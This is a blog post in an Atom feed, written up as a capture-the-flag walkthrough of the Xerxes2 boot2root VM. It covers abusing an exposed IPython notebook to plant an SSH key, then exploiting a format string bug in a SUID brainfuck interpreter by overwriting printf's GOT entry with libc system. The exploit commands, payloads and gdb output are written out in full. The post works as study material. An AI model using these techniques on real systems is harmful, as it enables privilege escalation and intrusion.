<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | #!/slash/note]]></title>
  <link href="http://leonjza.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://leonjza.github.io/"/>
  <updated>2014-08-14T08:13:40+02:00</updated>
  <id>http://leonjza.github.io/</id>
  <author>
    <name><![CDATA[Leon Jacobs]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Beating Xerxes 2 (No, Not the Persian King)]]></title>
    <link href="http://leonjza.github.io/blog/2014/08/09/beating-xerxes2/"/>
    <updated>2014-08-09T16:59:53+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/08/09/beating-xerxes2</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Xerxes2 is a successor in a boot2root series by <a href="https://twitter.com/barrebas">@barrebas</a> hosted by <a href="https://twitter.com/vulnhub">@VulnHub</a>. If you haven&rsquo;t done it yet, close this article <em>now</em> and go learn by doing it!</p>

<p>Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read <code>/root/flag.txt</code>. This is the path I took to read the flag and gain root command execution. Enjoy!</p>

<h2>getting started</h2>

<p>The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:</p>

<p>```bash nmap of 192.168.56.102 (cleaned up)
root@kali:~# nmap -v &mdash;reason -sV 192.168.56.102 -p-</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-08-09 17:14 SAST
[&hellip;]
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
80/tcp    open  http    syn-ack lighttpd 1.4.31
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
4444/tcp  open  krb524? syn-ack
8888/tcp  open  http    syn-ack Tornado httpd 2.3
57504/tcp open  status  syn-ack 1 (RPC #100024)
[&hellip;]
Nmap done: 1 IP address (1 host up) scanned in 192.62 seconds</p>

<pre><code>       Raw packets sent: 131149 (5.770MB) | Rcvd: 88 (3.544KB)
</code></pre>

<p>```</p>

<p>Well this gives us a boat load to test out already!</p>

<p>I quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened <code>nc</code> to the port and redirected the output to a file <code>nc-string</code>. Once the string echoed completely, I quit the <code>nc</code>, and pushed the resultant string through a base64 decode and ran a <code>file</code> against it:</p>

<p>```bash String from tcp/4444
root@kali:~#  nc 192.168.56.102 4444 | tee nc-string
[&hellip;]
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo=
^C</p>

<p>root@kali:~# cat nc-string | base64 -d > nc-data
root@kali:~# file nc-data
nc-data: MPEG ADTS, layer III, v2,  64 kbps, 22.05 kHz, Monaural</p>

<p>```</p>

<p><code>nc-data</code> is a, audio file? Ok. I copied the file off Kali Linux, opened it in VLC player and pressed play.</p>

<p><em>(Electronic Noises &amp; Robot Voice)</em> <em>This is Xerxes. Why do you persist in your loneliness?</em> <em>(Electronic Noises)</em></p>

<p>The start and end of the voice message had a clear in &amp; out sound, with some static noises in the background. Then, at the end a strange whistling noise could be heard.</p>

<p>This was the first educational bus ride the Xerxes2 took me on. Learning about the structures of mp3 files etc.</p>

<p>Sadly, this file kept me busy for quite some time, trying to find a hidden message. In the end, I gave up and moved on to the other ports open the VM. Maybe I had to come back to this later, but the little progress I had made had me hope I didn&rsquo;t have to.</p>

<h2>first shell access</h2>

<p>Moving on to tcp/80, a standard website with not much interesting apart from a cool looking Xerxes2 logo was found:</p>

<p><img class="<a" src="href="https://i.imgur.com/67BEjmV.png">https://i.imgur.com/67BEjmV.png</a>"></p>

<p>However, moving on to tcp/8888, we see it identified as <code>Tornado httpd 2.3</code>. Some of you may recognize Tornado as a python httpd server. So, off to a browser we go!</p>

<p>tcp/8888 hosted a <a href="http://ipython.org/notebook.html">IPython Notebook</a>. We were able to easily create a new note, and abuse the shell command functionality of it for our own purposes. Shell command access could be achieved by prefixing typical shell commands with a <code>!</code>. I used this to enumerate a small bit of the current environment, and quickly decided to add myself a ssh key so that I can play further. So, I generated a new key pair just for Xerxes, and uploaded it for the <code>delacroix</code> user:</p>

<p><img class="<a" src="href="https://i.imgur.com/JrTDTPn.png">https://i.imgur.com/JrTDTPn.png</a>"></p>

<p>And then a easy SSH in:</p>

<p>```bash
root@kali:~# ssh -i delacroix <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#100;&#x65;&#108;&#97;&#x63;&#114;&#111;&#x69;&#x78;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#53;&#54;&#x2e;&#49;&#x30;&#x32;">&#x64;&#x65;&#108;&#97;&#x63;&#114;&#111;&#x69;&#x78;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#x35;&#54;&#46;&#49;&#x30;&#50;</a>
The authenticity of host &lsquo;192.168.56.102 (192.168.56.102)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;192.168.56.102&rsquo; (ECDSA) to the list of known hosts.</p>

<p>Welcome to xerxes2.</p>

<pre><code>  XERXES wishes you
   a pleasant stay.
</code></pre>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
 </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>delacroix@xerxes2:~$
```</p>

<h2>becoming polito &ndash; the why</h2>

<p>Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary <code>/opt/bf</code>, owned by <code>polito</code> and had the SUID bit set for him. There was also a folder <code>/opt/backup</code>, with a file <code>korenchkin.tar.enc</code>. There was also mail in <code>/var/mail</code> for the user <code>korenchkin</code> which I am not able to read yet.</p>

<p>More interestingly, the <code>.bash_history</code> for the user I am now (delacroix), revealed that the <code>/opt/bf</code> command was recently run, and the sources for this binary was available as <code>bf.c</code>.</p>

<p>```bash delacroix Home and history
delacroix@xerxes2:~$ ls -lh
total 8.0K
-rw-r&mdash;r&mdash; 1 delacroix delacroix 1.6K Jul 16 12:42 bf.c
-rw-r&mdash;r&mdash; 1 delacroix delacroix  100 Aug  9 10:23 Untitled0.ipynb</p>

<p>delacroix@xerxes2:~$ history</p>

<pre><code>1  cd
2  ls -alh
3  /opt/bf "&lt;&lt;++++[&gt;++++&lt;-]&gt;[&gt;+++++&gt;+++++&gt;+++++&gt;+++++&gt;++&gt;++++&gt;++++&gt;++++&gt;+++++&gt;++++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;----&gt;-&gt;-&gt;-----&gt;&gt;++++&gt;+++++&gt;+++++&gt;&gt;+++++&gt;++#"
4  cp /media/politousb/bf.c .
5  nano bf.c
6  exit
7  passwd
8  exit
</code></pre>

<p>delacroix@xerxes2:~$ /opt/bf &ldquo;&lt;&lt;++++[>++++&lt;&ndash;]>[>+++++>+++++>+++++>+++++>++>++++>++++>++++>+++++>++++>+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&ndash;]>&mdash;&mdash;>&ndash;>&ndash;>&mdash;&mdash;&ndash;>>++++>+++++>+++++>>+++++>++#&rdquo;
LOOK DEEPERdelacroix@xerxes2:~$
```</p>

<p>As you can see above, running it just prints <strong>LOOK DEEPER</strong>. I recognized the syntax as <a href="http://en.wikipedia.org/wiki/Brainfuck">brainfk</a> and figured that <code>/opt/bf</code> was simply a brainfk interpreter. But wait, lets inspect <code>bf.c</code>!</p>

<h3>inspecting bf.c</h3>

<p>A quick read of <code>bf.c</code> confirmed the suspicions that <code>/opt/bf</code> was simply a brainfk interpreter. A buffer was set for the input program, then a function called <code>bf()</code> was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:</p>

<p>```c bf.c brainfk interpreter
case &lsquo;.&rsquo;:</p>

<pre><code>printf("%c", buf[datapointer]);
break;
</code></pre>

<p>case &lsquo;,&rsquo;:</p>

<pre><code>buf[datapointer] = getchar();
break;
</code></pre>

<p>case &lsquo;>&rsquo;:</p>

<pre><code>datapointer = (datapointer == (BUF_SIZE-1)) ? 0 : ++datapointer;
break;
</code></pre>

<p>case &lsquo;&lt;&rsquo;:</p>

<pre><code>datapointer = (datapointer == 0) ? (BUF_SIZE-1) : --datapointer;
break;
</code></pre>

<p>case &lsquo;+&rsquo;:</p>

<pre><code>buf[datapointer]++;
break;
</code></pre>

<p>case &lsquo;&ndash;&rsquo;:</p>

<pre><code>buf[datapointer]--;
</code></pre>

<p>```</p>

<p>Soooo, here we started on the second educational bus ride to mount brainfk. In summary, I learnt that I could write a program as simple as <code>,.</code>, and run it with <code>/opt/bf</code>, which will accept a character and then echo it back to me immediately. I also learnt that if you had say, 62 <code>+</code>, and ran that with a brainfk interpreter like <code>/opt/bf</code>, then you would have the character with ASCII value 62 in memory. You can then print that value with <code>.</code>, or move on the next memory cell with a <code>&lt;</code>. The most important thing to learn about brainfk was, <em>there are no high level features. No file IO, no socket IO, nothing</em>.</p>

<p>That was our brainfk class for the day.</p>

<h3>finding the bf vuln</h3>

<p>With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read <code>bf.c</code>, and realized that one of the case statements was for <code>#</code>, and that when a hash is present it will run:</p>

<p>```c bf.c format string vulnerability
case &lsquo;#&rsquo;:</p>

<pre><code>// new feature
printf(buf);
break;
</code></pre>

<p>```</p>

<p>Classic format string vulnerability!</p>

<p>As exciting as this may seem, it was not really for me. I had already previously struggled with a format string vulnerability, and this case it was present so early in the CTF that I feared I would not be able to complete this one. However, the goal was now clear. I need to <em>somehow</em> exploit this format string vuln, as brainfk, and get that to run my own code, potentially gaining me a shell as <code>polito</code>.</p>

<h2>becoming polito &ndash; the how</h2>

<p>Doing research about format string vulnerabilities, you will see that generally the flow goes something along the lines of:</p>

<ul>
<li>print <code>AAAA%x%x%x%x</code>, adding <code>%s</code> until you see the hex for of A (41), meaning that you are trying to find the position in the stack that <code>printf</code> is placing the arguments.</li>
<li>Test for direct parameter access. Assuming you saw the 41414141 in position 16, test with a payload of <code>AAAA%16$x</code>.</li>
<li><code>objdump -R /your/bin</code> and find a call in the GOT to override.</li>
<li>Place some shellcode as environment variable, ie: <code>EGG</code>, prefixed with say 200 <code>0x90</code>.</li>
<li>use <code>gdb</code>, and find your NOP sled, and choose a position in memory to where you want to override the pointer for a call from the GOT.</li>
<li>Calculate the required padding of strings to get the correct memory address, and write it using the <code>%n</code> format string.</li>
<li>Profit?</li>
</ul>


<p>While this is all fine and dandy, it was not possible for me to <em>profit</em> with this. :( In fact, the there is nothing wrong with the theory, its just that the conditions were slightly different. <code>/opt/bf</code> was compiled with the NX bit, and ASLR is enabled. Oh, and I actually have no idea what I am doing :D</p>

<p>So, let me take this step by step on how <code>/opt/bf</code> can be exploited using a format string vulnerability, encoded in brainfk, with the NX bit set and ASLR enabled.</p>

<h3>/opt/bf &ndash; part1</h3>

<p>To start, I had to recap in the sadly limited knowledge I already have of format string vulnerabilities. Some resources I found useful were:</p>

<ul>
<li><a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></li>
<li><a href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html">http://codearcana.com/posts/2013/04/28/picoctf-videos.html</a></li>
<li><a href="http://youtu.be/NwzmYSlETI8">http://youtu.be/NwzmYSlETI8</a></li>
<li><a href="http://youtu.be/CHrs30g-3O0">http://youtu.be/CHrs30g-3O0</a></li>
</ul>


<p>So, lets work with this.</p>

<p>First of all, the program will only <code>printf(buf)</code> the buffer which is brainfk. This is triggered with a <code>#</code>. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to <code>/opt/bf</code>. Remembering the research that was done, I opted to print as many <code>+</code>&rsquo;s as the ASCII value of the character I wanted, and them simply increment the data cell with <code>&gt;</code>, preparing for the next character.</p>

<p>To test my theory, I prepared my first payload using <code>python -c</code>:</p>

<p><code>bash brainfk payload encoding (cleaned up)
delacroix@xerxes2:~$ echo $(python -c 'print "+" * ord("a")')
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
delacroix@xerxes2:~$ /opt/bf "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#"
a
</code></p>

<p>That printed the character <code>a</code> as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it <code>printf(buf)</code> that too?</p>

<p><code>bash brainfk payload encoding multiple characters (cleanedup)
delacroix@xerxes2:~$ /opt/bf "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#"
aa
</code></p>

<p>2 <code>a</code>! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use <a href="https://docs.python.org/2/tutorial/datastructures.html#list-comprehensions">list comprehension</a> to prepare our payloads for <code>/opt/bf</code>:</p>

<p><code>python final brainfk encoding for /opt/bf
print "&gt;".join(["+" * ord(x) for x in ("the quick brown fox")])
</code></p>

<p>You can copy and paste the above command into a python shell and see the amount of <code>+</code> there are haha.</p>

<p>Anyways, that settled the brainfk problem.</p>

<h3>/opt/bf &ndash; part2</h3>

<p>Now that we can easily provide input to <code>/opt/bf</code> to print using the vulnerable <code>printf()</code> function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some <code>AAAA</code> and search for them:</p>

<p><code>bash /opt/bf format string testing
delacroix@xerxes2:~$ /opt/bf "$(python -c 'print "&gt;".join(["+" * ord(x) for x in ("AAAA" + ".%x" * 20 + "\n")])')#"
AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e
</code></p>

<p>Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the <code>AAAA</code> input we have given it. Instead of typing like 20 <code>%s</code>, I just use python to do the hard work for me. As you can see, the string <code>41414141</code> is present in the output. We can test if we are able to use direct parameter access to access just the string we want:</p>

<p><code>bash /opt/bf format string direct parameter access
delacroix@xerxes2:~$ /opt/bf "$(python -c 'print "&gt;".join(["+" * ord(x) for x in ("AAAA" + ".%16$x" "\n")])')#"
AAAA.41414141
</code></p>

<p>Yup! Parameter 16 gives us what we need :)</p>

<p>Great. Were making progress&hellip; I think.</p>

<p>For the sake of time, I am not going to document the 412643932471236 attempts that were made at getting this to work. Instead, here is the path that did eventually work. This is the part of Xerxes2 that undoubtedly took me the longest to get right.</p>

<h3>/opt/bf &ndash; part3</h3>

<p>Now that we know where we can start manipulating pointers, we need to find out <em>what</em> we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.</p>

<p>First of all, <code>/opt/bf</code> was compiled with the NX bit:</p>

<p><code>bash /opt/bf RW Only stack
delacroix@xerxes2:~$ readelf -l /opt/bf | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
</code></p>

<p>Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:</p>

<p>```bash ASLR check on /opt/bf
delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7734000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb75c9000)
/lib/ld-linux.so.2 (0xb7735000)
</code></pre>

<p>delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb779b000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7630000)
/lib/ld-linux.so.2 (0xb779c000)
</code></pre>

<p>delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb77c0000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7655000)
/lib/ld-linux.so.2 (0xb77c1000)
</code></pre>

<p>delacroix@xerxes2:~$
```</p>

<p>Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with <code>ulimit -s unlimited</code></p>

<p>```bash ASLR disable
delacroix@xerxes2:~$ ulimit -s unlimited</p>

<p>delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0x4001e000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0x4001e000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0x4001e000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>delacroix@xerxes2:~$
```</p>

<p>The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:</p>

<p>```bash /bin/opt GOT
delacroix@xerxes2:~$ objdump -R /opt/bf</p>

<p>/opt/bf:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049a38 R_386_GLOB_DAT    <strong>gmon_start</strong>
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar</p>

<p>delacroix@xerxes2:~$
```</p>

<p>Here, we will choose to override the <code>printf</code> functions pointer. This is at 0x08049a48. So, this address will have the location of our <em>evil code</em>. But now, how do we know where the evil code is and <em>what</em> is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">ret2libc</a>. The basic idea here is that we override the pointer for <code>printf</code> to <code>system</code> with a argument. I highly recommend you read <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">this pdf</a> for a proper explanation on what exactly this means.</p>

<p>The only thing that is left to determine is where <code>system</code> is in memory. Luckily this is also pretty easy to find out. Fire up <code>gdb</code>, run the binary and <code>print system</code> to get the address:</p>

<p><code>bash libc's system
delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...(no debugging symbols found)...done.
(gdb) run
Starting program: /opt/bf
usage: /opt/bf [program]
[Inferior 1 (process 11342) exited with code 0377]
(gdb) print system
$1 = {&lt;text variable, no debug info&gt;} 0x40062000 &lt;system&gt;
(gdb)
</code></p>

<p>Soooo, 0x40062000. We have the point in memory where <code>system()</code> lives, and we know where the program is going to go to lookup the <code>printf</code> function. All that is left now is to exploit the format string vulnerability, override the location of <code>printf</code> with <code>system</code>, and provide a new argument for the now fooled <code>printf</code> to run. A new argument can be given by simply providing another <code>#</code> (remember we have the source so that was easy to figure out).</p>

<h3>/opt/bf &ndash; part4</h3>

<p>We have all the information we need, lets get to work.</p>

<p>We fire up <code>gdb</code>, and instead of printing the location of <code>AAAA</code>, we provide a memory address, with a <code>%n</code> format string so that we can write the amount of bites needed to override the pointer location.</p>

<p>To aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:</p>

<p>```bash
delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf&hellip;(no debugging symbols found)&hellip;done.</p>

<p>(gdb) disass main
Dump of assembler code for function main:
   0x08048684 &lt;+0>: push   %ebp
   0x08048685 &lt;+1>: mov    %esp,%ebp
   0x08048687 &lt;+3>: and    $0xfffffff0,%esp
   0x0804868a &lt;+6>: sub    $0x7540,%esp
   0x08048690 &lt;+12>:    cmpl   $0x1,0x8(%ebp)
   0x08048694 &lt;+16>:    jg     0x80486b7 &lt;main+51>
   0x08048696 &lt;+18>:    mov    0xc(%ebp),%eax
   0x08048699 &lt;+21>:    mov    (%eax),%eax
   0x0804869b &lt;+23>:    mov    %eax,0x4(%esp)
   0x0804869f &lt;+27>:    movl   $0x804887c,(%esp)
   0x080486a6 &lt;+34>:    call   0x8048390 &lt;printf@plt>
   0x080486ab &lt;+39>:    movl   $0xffffffff,(%esp)
   0x080486b2 &lt;+46>:    call   0x80483c0 &lt;exit@plt>
   0x080486b7 &lt;+51>:    movl   $0x7530,0x8(%esp)
   0x080486bf &lt;+59>:    movl   $0x0,0x4(%esp)
   0x080486c7 &lt;+67>:    lea    0x10(%esp),%eax
   0x080486cb &lt;+71>:    mov    %eax,(%esp)
   0x080486ce &lt;+74>:    call   0x80483e0 &lt;memset@plt>
   0x080486d3 &lt;+79>:    mov    0xc(%ebp),%eax
   0x080486d6 &lt;+82>:    add    $0x4,%eax
   0x080486d9 &lt;+85>:    mov    (%eax),%eax
   0x080486db &lt;+87>:    lea    0x10(%esp),%edx
   0x080486df &lt;+91>:    mov    %edx,0x4(%esp)
   0x080486e3 &lt;+95>:    mov    %eax,(%esp)
   0x080486e6 &lt;+98>:    call   0x80484ec <bf>
   0x080486eb &lt;+103>:   movl   $0x0,(%esp) # &lt;&mdash; we will break here
   0x080486f2 &lt;+110>:   call   0x80483c0 &lt;exit@plt>
End of assembler dump.</p>

<p>(gdb) break *0x080486eb
Breakpoint 1 at 0x80486eb</p>

<p>(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;%16$n&rdquo;)])&rsquo;)#&ldquo;
Starting program: /opt/bf &rdquo;$(python -c &lsquo;print &ldquo;>&rdquo;.join([&ldquo;+&rdquo; * ord(x) for x in (&ldquo;\x48\x9a\x04\x08&rdquo; + &ldquo;%16$n&rdquo;)])&rsquo;)#"</p>

<p>Breakpoint 1, 0x080486eb in main ()</p>

<p>(gdb) x/x 0x08049a48
0x8049a48 <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x70;&#x72;&#105;&#x6e;&#116;&#102;&#x40;&#x67;&#x6f;&#116;&#46;&#x70;&#108;&#116;">&#112;&#114;&#105;&#110;&#116;&#102;&#x40;&#103;&#x6f;&#x74;&#46;&#x70;&#x6c;&#116;</a>: 0x00000004
(gdb)
```</p>

<p>Oooooooooooh. So basically 0x8049a48 now says <code>printf</code> lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to <code>system</code>, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.</p>

<p><code>bash Calculating the first offset
(gdb) shell echo $(python -c 'print 0x2000-0x4')
8188 # output is a decimal value
</code></p>

<p>We now pad the format string as required, re-run the program in <code>gdb</code>, and inspect 0x08049a48 from the GOT</p>

<p>```bash first padded string
(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;%8188u%16$n&rdquo;)])&rsquo;)#&ldquo;
The program being debugged has been started already.
Start it from the beginning? (y or n) y</p>

<p>Starting program: /opt/bf &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;%8188u%16$n&rdquo;)])&rsquo;)#&ldquo;
H�                                                                                                                                                                                                               <br/>
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x70;&#x72;&#105;&#110;&#x74;&#102;&#x40;&#103;&#x6f;&#x74;&#x2e;&#x70;&#x6c;&#x74;">&#x70;&#x72;&#105;&#110;&#x74;&#x66;&#64;&#103;&#111;&#116;&#x2e;&#x70;&#x6c;&#x74;</a>: 0x00002000
(gdb)
```</p>

<p>You will see some whitespace output as a result of the <code>%8188u</code>, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.</p>

<p>```bash writing upper part of memory and offset change
(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8188u%16$n&rdquo; + &ldquo;%17$n&rdquo;)])&rsquo;)#&ldquo;
The program being debugged has been started already.
Start it from the beginning? (y or n) y</p>

<p>Starting program: /opt/bf &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8188u%16$n&rdquo; + &ldquo;%17$n&rdquo;)])&rsquo;)#&ldquo;
H�J�                                                                                                                                                                                                              3
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#112;&#x72;&#x69;&#x6e;&#116;&#x66;&#64;&#x67;&#111;&#x74;&#x2e;&#112;&#108;&#x74;">&#x70;&#x72;&#x69;&#x6e;&#116;&#102;&#64;&#x67;&#x6f;&#x74;&#x2e;&#x70;&#x6c;&#x74;</a>: 0x20042004
(gdb)
```</p>

<p>As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:</p>

<p>```bash calculating the upper part and fixing the offset
(gdb) shell echo $(python -c &lsquo;print 0x4006-0x2000&rsquo;)
8198 # output is a decimal value</p>

<p>(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8184u%16$n&rdquo; + &ldquo;%8198u%17$n&rdquo;)])&rsquo;)#&ldquo;
The program being debugged has been started already.
Start it from the beginning? (y or n) y</p>

<p>Starting program: /opt/bf &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8184u%16$n&rdquo; + &ldquo;%8198u%17$n&rdquo;)])&rsquo;)#&ldquo;
H�J�                                                                                                                                                                                                             <br/>
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#112;&#114;&#105;&#110;&#x74;&#x66;&#x40;&#x67;&#x6f;&#116;&#46;&#x70;&#x6c;&#x74;">&#x70;&#x72;&#x69;&#110;&#116;&#102;&#x40;&#x67;&#x6f;&#x74;&#46;&#112;&#x6c;&#x74;</a>: 0x40062000
(gdb)
```</p>

<p>w00t. We have rewritten the GOT for <code>printf</code> to the location of the libc <code>system</code> call using the format string vulnerability. Phew.</p>

